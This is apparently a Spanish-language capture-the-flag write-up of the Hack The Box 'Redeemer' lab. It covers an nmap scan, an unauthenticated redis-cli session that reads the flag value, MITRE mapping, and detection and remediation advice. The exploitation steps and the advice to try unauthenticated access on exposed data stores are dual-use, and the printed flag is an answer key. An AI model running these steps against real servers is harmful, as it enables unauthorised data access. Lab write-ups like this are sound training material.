---
tags:
  - htb
  - starting-point
  - tier-0
  - easy
  - linux
  - redis
  - Terminada
ip: 10.129.136.187
os: Linux
difficulty: Easy
status: Terminada
tiempo: 1h 0m
fecha_inicio: 2026-06-23
fecha_completada: 2026-06-23
puntos: 0
mitre_tactics: [Initial Access, Discovery, Collection]
mitre_techniques: [T1190, T1046, T1005]
---

# 🖥️ Redeemer — Linux — Easy (Tier 0)

> [!info] Resumen
> **IP:** `10.129.136.187` | **OS:** Linux | **Tier/Fase:** 0 | **Tiempo:** 1h 0m
> Redis 5.0.7 expuesto en 6379 sin autenticación — acceso directo y extracción de flag desde la base de datos.

---

## 1. Reconocimiento

```bash
nmap -sCV -p- --min-rate 5000 10.129.136.187 -oN nmap.txt
```

| Puerto   | Servicio | Versión | Hallazgo clave              |
| -------- | -------- | ------- | --------------------------- |
| 6379/TCP | Redis    | 5.0.7   | Sin autenticación requerida |

**→ Vector:** Redis sin auth accesible desde exterior — conexión directa con `redis-cli`.

---

## 2. Explotación

> Vector principal: Redis sin autenticación (misconfiguration)

```bash
redis-cli -h 10.129.136.187

10.129.136.187:6379> PING
PONG

10.129.136.187:6379> INFO keyspace
# Keyspace
db0:keys=4,expires=0,avg_ttl=0

10.129.136.187:6379> SELECT 0
OK

10.129.136.187:6379> KEYS *
1) "temp"
2) "stor"
3) "numb"
4) "flag"

10.129.136.187:6379> GET flag
"03e1d2b376c37ab3f5319922053953eb"
```

> [!success] Flag obtenida
> `03e1d2b376c37ab3f5319922053953eb`

---

## 3. Escalación de Privilegios

N/A — acceso a datos sin necesidad de escalación de privilegios en el sistema.

---

## 4. MITRE ATT&CK

| Táctica        | Técnica                        | ID    | Uso en esta máquina                  |
| -------------- | ------------------------------ | ----- | ------------------------------------ |
| Discovery      | Network Service Scanning       | T1046 | nmap identifica Redis en 6379        |
| Initial Access | Exploit Public-Facing App      | T1190 | Redis sin auth, acceso sin credenciales |
| Collection     | Data from Information Repositories | T1213 | Enumeración y extracción de keys desde Redis |

---

## 5. Detección & Remediación

**Blue Team detecta:**
- Conexiones externas al puerto 6379 desde IPs no autorizadas (firewall/IDS logs)
- Comandos `KEYS *`, `GET`, `SELECT` ejecutados sin sesión autenticada (Redis slowlog / audit)

**Remediación:**
- Habilitar `requirepass` en `redis.conf` — contraseña fuerte obligatoria
- Bindear Redis solo a `127.0.0.1` o red interna (`bind 127.0.0.1`)
- Firewall: bloquear 6379 desde Internet; exponer solo a servicios que lo necesiten

---

## 6. Lecciones

- Redis sin `requirepass` y bind abierto = acceso total sin credenciales; es misconfiguration, no CVE
- `INFO keyspace` antes de `KEYS *` — identifica qué bases de datos existen y cuántas claves tienen
- Patrón replicable: servicios de almacenamiento expuestos (Redis, Memcached, MongoDB) → intentar conexión sin auth antes de buscar exploits

**Bloqueado:**

| Fase | Causa | Fix |
|------|-------|-----|
| — | — | — |

---

## 7. Conexiones

- Similar: `[[HTB/Fawn/Fawn]]` (servicio expuesto sin auth — FTP anónimo)
- Técnica: `[[Técnicas/Redis-Unauthenticated]]`

**Referencias:** [HackTricks - Redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis) · [Redis Security Docs](https://redis.io/docs/management/security/)
